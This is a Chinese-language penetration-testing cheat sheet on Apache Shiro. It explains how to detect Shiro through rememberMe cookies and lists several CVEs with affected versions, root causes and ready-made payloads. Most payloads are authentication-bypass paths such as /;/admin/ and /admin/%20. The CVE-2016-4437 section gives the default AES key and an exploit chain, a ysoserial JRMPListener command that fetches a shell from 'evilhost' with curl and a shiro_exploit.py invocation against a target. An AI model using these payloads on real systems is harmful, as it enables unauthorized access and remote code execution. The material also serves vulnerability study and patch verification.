# Apache Shiro

## 概念

```
Apache Shiro 是一个强大且易用的 Java 安全框架可以和spring一起使用
```

## 作用

```
Shiro可以帮我们完成 :认证、授权、加密、会话管理、与 Web 集成、缓存等。
```

## 应用场景

```
登录
```

## 判断网站是否使用了shiro

```
未登陆的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段
```

```
登陆失败的话，不管勾选RememberMe字段没有，返回包都会有rememberMe=deleteMe字段
```

```
找到网站登录的地方，随便输入账号密码抓包（一定要输入点击登录），看返回包是否有remembeMe字段
```

## shiro漏洞产生总结(暂定)

```
cve-2016-4437   默认密钥公开，remeber cookie 反序列化 导致的安全问题

cve-2022-32532 1.9.0以前版本的regexpatternmatcher默认使用的正则匹配的“.”不会匹配换行符 因此可以使用在路径中添加换行符来绕过权限匹配。

其他权限绕过 ： 关键点在于 apache shiro 和 spring boot 对目录解析的差异导致的
```



## shiro漏洞

### Apache Shiro RegExPatternMatcher 权限绕过漏洞（CVE-2022-32532）

**影响版本**

```
Apache Shiro < 1.9.1 不受影响 Apache Shiro >= 1.9.1
```

**原因**

```
Apache Shiro 1.9.1前的版本RegExPatternMatcher在使用带有“.”的正则时，可能会导致权限绕过。漏洞源于RegExPatternMatcher默认使用的正则匹配的“.”不会匹配换行符，因此可以使用在路径中添加换行符来绕过权限匹配。
```

**payload**

```
这个请求可以成功
GET /permit/any HTTP/1.1
Token: 4ra1n

没有令牌请求头时不允许访问
GET /permit/any HTTP/1.1

它可以在特殊但常见的配置中以简单的方式绕过
GET /permit/a%0any HTTP/1.1
```



### apache shiro 认证机制不恰当(CVE2021-41303)

 **影响版本**

```
Apache Shiro < 1.8.0  不受影响 Apache Shiro > 1.8.0
```

**原因**

```
Apache Shiro 存在授权问题漏洞，该漏洞源于Apache Shiro在1.8.0版本之前，当使用Apache Shiro与Spring Boot时，一个特别制作的HTTP请求可能会导致身份验证绕过。
```

**payload**

```
暂无
```



### Apache Shiro < 1.7.1 权限绕过漏洞（CVE-2020-17523)

https://github.com/jweny/shiro-cve-2020-17523

**影响版本**

```
 Apache Shiro < 1.7.1  不受影响 Apache Shiro >= 1.7.1 版本
```

**原因**

```
存在漏洞的shiro版本，由于调用tokenizeToStringArray方法时，trimTokens参数默认为true，空格会经过trim()处理，因此导致空格被清除。再次返回getChain时最后一个/被删除，所以/admin与/admin/*匹配失败，导致鉴权绕过。而Spring接受到的访问路径为/admin/%20，按照正常逻辑返回响应，因此导致权限被绕过。
```

**payload**

```
姿势一：

http://127.0.0.1:8080/admin/%20 或 http://127.0.0.1:8080/admin/%20/

使用空格等空字符，可绕过shiro身份验证。

姿势二：

经过和p0desta师傅交流，发现还有另一种特殊场景下的利用方式。

http://127.0.0.1:8080/admin/%2e 或 http://127.0.0.1:8080/admin/%2e/
但是在开启全路径的场景下setAlwaysUseFullPath(true)是可以正常匹配的。

```



### Shiro < 1.5.3 验证绕过漏洞(CVE-2020-11989)

https://zhuanlan.zhihu.com/p/353423631

**影响版本**

```
Shiro < 1.5.3 
```

**原因**

```
利用springboot 和 shiro解析差异
我们在访问一个被不需要鉴权就能访问的页面的时候，如果在后面加上;/一个需要权限的路径，在分号的地方会被shiro截断，从而绕过鉴权。

11989针对于/admin/page，这种固定路由，shiro得到的地址为/，因此认为可以访问，Spring得到的地址为/admin/page，从而定位到未授权的页面
```

**payload**

```
找一个不需要鉴权的页面进行访问，比如根目录。在其后加上;,再加上一个需要鉴权的目录进行访问（/admin/）。访问结果如下，成功绕过鉴权访问到admin目录：
http://ip:8080/;/admin/
或者
http://ip:8080/%3b/admin/
```

### Apache Shiro < 1.5.2 验证绕过漏洞(CVE-2020-1957)

**影响版本**

```
 Apache Shiro < 1.5.2 
```

**原因**

```
传入的恶意访问路径/xxxxx/..;/admin,经过shiro校验处理时，会在;处进行截断，对/xxxxx/..路径进行权限校验，而该路径又恰好满足校验规则，从而检验成功后将传入的路径/xxxxx/..;/admin交给spring boot 的控制器进行解析，而spring boot的解析后的路径是访问/admin,从而返回/admin路径下的内容给攻击者，从而实现权限绕过。
```

**payload**

```
/xxx/..;/{后台资源}
```

### Apache Shiro <= 1.2.4 默认密钥致命令执行漏洞（CVE-2016-4437）

**影响版本**

```
 Apache Shiro <= 1.2.4  不受影响  Apache Shiro > 1.2.4
```

**原因**

```
在 1.2.4 版本前，是默认ASE秘钥，Key: kPH+bIxk5D2deZiIxcaaaA==，可以直接反序列化执行恶意代码。而在1.2.4之后，ASE秘钥就不为默认了，需要获取到Key才可以进行渗透

Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。

Shiro记住用户会话功能的逻辑为：

获取RememberMe的值 —> Base64解密 —> ASE解密 –> 反序列化

在服务端接收cookie值时，按照如下步骤来解析处理：

1、检索RememberMe cookie 的值
2、Base 64解码
3、使用AES解密(加密密钥硬编码)
4、进行反序列化操作（未作过滤处理）
在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。

因为在反序列化时，不会对其进行过滤，所以如果传入恶意代码将会造成安全问题
```

**payload**

```
exp: https://github.com/insightglacier/Shiro_exploit
配置环境 ： python2.7 jdk1.8

服务器：

java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 'curl evilhost/shell –o shell'

本地：

python shiro_exploit.py -u http://target/ -t 2 -g JRMPClient -p "remote_host:1099" -k "kPH+bIxk5D2deZiIxcaaaA=="
```

### Apahce Shiro < 1.6.0 验证绕过漏洞(CVE-2020-13933)

**影响版本**

```
 Apahce Shiro < 1.6.0
```

**原因**

```
关键点还是在于shiro对URI的处理与Spring对URI处理方式的不同
```

**payload**

```
/admin/%3bxxxx

传入一个payload:/admin/%3bpage后，shiro是先url解码再去除;,而spring则相反，是先去除;再进行url解码。因此导致漏洞

13933则是匹配非固定地址路由，比如/admin/{name}，因为shiro得到的是/admin/，是个目录，默认是可以访问的，只是该目录下的资源需要验证，而Spring得到的是/admin/;page，如果也采取固定路由，则会因为找不到;page，从而返回404
```



### Apahce Shiro < 1.7.1 权限绕过漏洞

**影响版本**

```
apache shiro < 1.7.1 
```

**原因**

```
原因都是在于其鉴权机制和spring鉴权机制不一样，导致的权限绕过。其被绕过的原因在于，访问一个受限的目录,在其目录后面加上一个空格，成为受限目录/%20/这样的形式的时候，由于shiro在校验时，会删除字符串中的空格，导致匹配失败，该路径就不会进行鉴权。而spring在匹配是，匹配到的就是正常输入的路径 /受限目录/%20 ,就会按照正常逻辑进行响应，造成鉴权绕过。
```

**payload**

```
/受限目录/%20
```



